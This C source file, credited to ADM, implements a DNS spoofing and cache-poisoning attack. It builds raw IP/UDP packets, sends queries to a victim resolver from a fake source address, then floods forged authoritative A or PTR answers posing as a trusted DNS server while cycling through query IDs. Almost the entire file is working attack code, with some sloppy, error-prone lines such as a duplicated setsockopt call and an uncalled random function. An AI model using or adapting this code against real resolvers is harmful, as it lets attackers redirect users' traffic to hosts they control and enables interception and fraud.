/*************************************************/
/*  DNS include for play with DNS packet (c) ADM */
/*************************************************/

#define   ERROR -1
#define   DNSHDRSIZE 12
#define   TYPE_A   1
#define   TYPE_PTR 12


int myrand()
{
 int j; 
 j=1+(int) (150.0*rand()/(RAND_MAX+1.0));
 return(j);
}


unsigned long  host2ip(char *serv)

{
  struct sockaddr_in sinn;
  struct hostent *hent;
      
  hent=gethostbyname(serv);
  if(hent == NULL) return 0;
  bzero((char *)&sinn, sizeof(sinn));
  bcopy(hent->h_addr, (char *)&sinn.sin_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
 }

  

void nameformat(char *name,char *QS)
{
/* CRAP & LAme COde :) */
char lol[3000];
char tmp[2550];
char tmp2[2550];
int  i,a=0;
bzero(lol,sizeof(lol));
bzero(tmp,sizeof(tmp));
bzero(tmp2,sizeof(tmp2));



  for(i=0;i<strlen(name);i++)
     {
      if( *(name+i) == '.'  ){
          sprintf(tmp2,"%c%s",a,tmp);
          strcat(lol,tmp2);
          bzero(tmp,sizeof(tmp));
          bzero(tmp2,sizeof(tmp2));
          a=0;
          } 
       else  tmp[a++] = *(name+i);
     }
       
 sprintf(tmp2,"%c%s",a,tmp);
 strcat(lol,tmp2);
 strcpy(QS,lol);
 }     



void nameformatIP(char *ip, char *resu)
{
char *arpa = "in-addr.arpa";
char bla[255];
char arf[255];
char haha[255];
char c;
char *A[4];
int i,a=3,k=0;

bzero(bla,sizeof(bla));
bzero(arf,sizeof(arf));
bzero(haha,sizeof(haha));

for(i=0;i<4;i++){
  A[i] =(char *)malloc(4);
  bzero(A[i],4);
 }

bzero(bla,sizeof(bla));
bzero(arf,sizeof(arf));

for(i=0;i<strlen(ip);i++)
  {
   c = ip[i];
    if( c == '.'){
     strcat(A[a],arf); 
     a--;
     k=0;
     bzero(arf,sizeof(arf));
     }
   else arf[k++] = c;
  }
  
  strcat(A[a],arf);
  
 for(i=0;i<4;i++){
    strcat(bla,A[i]);
    strcat(bla,".");
    }
     

strcat(bla,arpa);
nameformat(bla,haha);
strcpy(resu,haha);
}   



int makepaketQS(char *data,char *name,int type)
{

if(type == TYPE_A ){
   nameformat(name,data);
   *( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_A);
 }

if(type == TYPE_PTR){
   nameformatIP(name,data);
   *( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
   }
        
   *( (u_short *) (data+strlen(data)+3) ) = htons(1); 
   return(strlen(data)+5);   

}


int makepaketAW(char *data,char *name, char *ip,int type)
{
int i;
char tmp[2550];
bzero(tmp,sizeof(tmp));

if( type == TYPE_A ){
   nameformat(name,data);
   *( (u_short *) (data+strlen(data)+1) ) = htons(1);
   *( (u_short *) (data+strlen(data)+3) ) = htons(1);        
   i=strlen(data)+5;
   strcpy(data+i,data);
   i=i+strlen(data)+1;    
   *((u_short *) (data+i))      = htons(TYPE_A);
   *((u_short *) (data+i+2))    = htons(1);
   *((u_long *) (data+i+4))    = 9999999;
   *((u_short *) (data+i+8))    = htons(4);
   *((u_long *) (data+i+10))   = host2ip(ip);
   return(i+14);
  }

if( type == TYPE_PTR ){
   nameformat(name,tmp);
   nameformatIP(ip,data);
   *( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
   *( (u_short *) (data+strlen(data)+3) ) = htons(1);  
   i=strlen(data)+5;
   strcpy((data+i),data);
   i=(i+strlen(data)+1);
   *((u_short *) (data+i))     = htons(TYPE_PTR);
   *((u_short *) (data+i+2))   = htons(1);
   *((u_long *) (data+i+4))    = 9999999;
   *((u_short *) (data+i+8))   = htons(strlen(tmp)+1);
   strcpy((data+i+10),tmp);
   return(i+10+strlen(tmp)+1);
  }
}

void sendquestion(u_long s_ip, u_long d_ip,char *name,int type)
{
 struct dnshdr *dns;
 char buff[1024];
 char *data;
 int i;
 int on=1;
 int sraw;

if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
   perror("socket");
   exit(ERROR);
   }
   
if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR)if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
  perror("setsockopt");
  exit(ERROR);
  }

dns  = (struct dnshdr *) buff;
data = (char *)(buff+DNSHDRSIZE);

bzero(buff,sizeof(buff));

dns->id      = 6000+myrand();
dns->qr      = 0;
dns->rd      = 1;
dns->aa      = 0;
dns->que_num = htons(1);
dns->rep_num = htons(0);
i=makepaketQS(data,name,type);
udp_send(sraw,s_ip,d_ip,1200+myrand,53,buff,DNSHDRSIZE+i);
close(sraw);       
}                                   

void sendawnser(u_long s_ip, u_long d_ip, char *name,char *spoofip,int ID,int type)
 {
 struct dnshdr *dns;
 char buff[1024];
 char *data;
 int i;
 int on=1;
 int sraw;
 
if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
   perror("socket");
   exit(ERROR);
   }
   
if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR)if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
  perror("setsockopt");
  exit(ERROR);
  }

dns  = (struct dnshdr *) buff;
data = (char *)(buff+DNSHDRSIZE);

bzero(buff,sizeof(buff));

  dns->id      = htons(ID);
  dns->qr      = 1;
  dns->rd      = 1;
  dns->aa      = 1;
  dns->que_num = htons(1);
  dns->rep_num = htons(1);
  i=makepaketAW(data,name,spoofip,type);
  printf(" I apres Makepaket == %i \n",i);
  udp_send(sraw,s_ip,d_ip,53,53,buff,DNSHDRSIZE+i);
  close(sraw);
 }           
                                     

void dnsspoof(char *dnstrust,char *victim,char *spoofname,char *spoofip,int ID,int type)
     {
     struct dnshdr *dns;
     char    buff[1024];
     char    *data;
     u_long fakeip;
     u_long trustip;
     u_long victimip;
     int loop,rere;
     
     dns  = (struct dnshdr *)buff;
     data = (char *)(buff+DNSHDRSIZE);
     
     
     
    trustip  = host2ip(dnstrust);
    victimip = host2ip(victim); 
    fakeip   = host2ip("12.1.1.0");
    
    /* send question ... */
   if( type ==  TYPE_PTR) 
     for(loop=0;loop<4;loop++)sendquestion(fakeip,victimip,spoofip,type);
   
   if( type == TYPE_A)
     for(loop=0;loop<4;loop++)
          sendquestion(fakeip,victimip,spoofname,type);
         
           
           /* now its time to awnser Quickly !!! */ 
     for(rere = 0; rere < 2;rere++){
        for(loop=0;loop < 80;loop++){
            printf("trustip %s,vitcimip %s,spoofna %s,spoofip %s,ID %i,type %i\n",
                 dnstrust,victim,spoofname,spoofip,ID+loop,type); 
          sendawnser(trustip,victimip,spoofname,spoofip,ID+loop,type);
         }
      }
    
    
    }
    
    



      